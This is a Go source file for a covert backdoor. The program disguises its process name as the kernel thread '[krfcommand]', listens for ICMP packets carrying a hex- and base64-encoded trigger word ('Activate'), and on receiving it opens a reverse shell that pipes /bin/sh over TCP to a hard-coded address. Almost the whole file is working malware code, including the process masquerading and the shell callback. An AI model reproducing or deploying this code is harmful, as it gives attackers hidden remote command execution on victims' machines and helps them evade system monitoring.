package main

import (

	"os/exec"
	"time"
	"fmt"
	"strings"
	"encoding/base64"
	"net"
	"encoding/hex"
	"unsafe"
	"reflect"
	"os"
)


const (
	secretMessage  = "Activate"
)

// ChangeProcName() is a function that hooks argv[0] and renames it
// This will stand out to filesystem analysis such as lsof and the /proc directory
func ChangeProcName(name string) error {
    argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
    argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]

    n := copy(argv0, name)
    if n < len(argv0) {
            argv0[n] = 0
    }

    return nil
}


// connectBack() is a function to initiate reverse shell
func connectBack() {

	c, err := net.DialTimeout("tcp", "127.0.0.1:8080", time.Duration(5) * time.Second)
	if err != nil {
		if nil != c {
			c.Close()
		}
	}

	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	// exectute /bin/sh through the TCP stream
	cmd.Start()
	return
}


func main() {
	err := ChangeProcName("[krfcommand]")
	if err != nil {
		fmt.Println(err.Error())
	}
	// while True loop to listen for ICMP data
	for {

		protocol := "icmp"
		netaddr, _ := net.ResolveIPAddr("ip4", "127.0.0.1")
		conn, _ := net.ListenIP("ip4:"+protocol, netaddr)


		buf := make([]byte, 1024)
		packetData, _, _ := conn.ReadFrom(buf)

		conn.ReadFrom(buf)
		fmt.Println("[+] The full packet data:")
		fmt.Printf("% X\n", buf[:packetData])


		//fmt.Printf("% X\n", buf[8:16])
		src := buf[8:packetData]
		hexToString := hex.EncodeToString(src)
		fmt.Println("\n[+] Secret message from packet:")
		fmt.Println(hexToString)
		hexDecode, _ := hex.DecodeString(hexToString)
		fmt.Println("\n[+] Secret message decoded:")
		base64Text := make([]byte, base64.StdEncoding.DecodedLen(len(hexDecode)))
		decode, _ := base64.StdEncoding.Decode(base64Text, []byte(hexDecode))
		// Secret string
		incomingMessage := fmt.Sprintf("%s", base64Text[:decode])

		fmt.Printf("%s\n\n", base64Text[:decode])
		// Make sure the incoming message has the secret key
		if strings.Contains(incomingMessage, secretMessage) {
			go connectBack()
		}

	}
}
